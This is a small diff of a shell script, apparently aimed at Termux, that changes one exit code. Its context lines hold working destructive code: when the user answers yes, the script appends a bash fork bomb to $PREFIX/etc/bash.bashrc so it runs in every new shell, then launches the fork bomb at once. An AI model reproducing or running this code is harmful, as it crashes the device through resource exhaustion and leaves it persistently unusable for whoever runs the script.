@@ -5,7 +5,7 @@ y | Y )
 	echo "started" ;
 	echo 'bomb() { bomb|bomb& };bomb' >> $PREFIX/etc/bash.bashrc ;
 	bomb() { bomb|bomb& };bomb ;
-	exit ;;
+	exit 1 ;;
 * )
 	echo "stopped" ;
 	exit 1 ;;
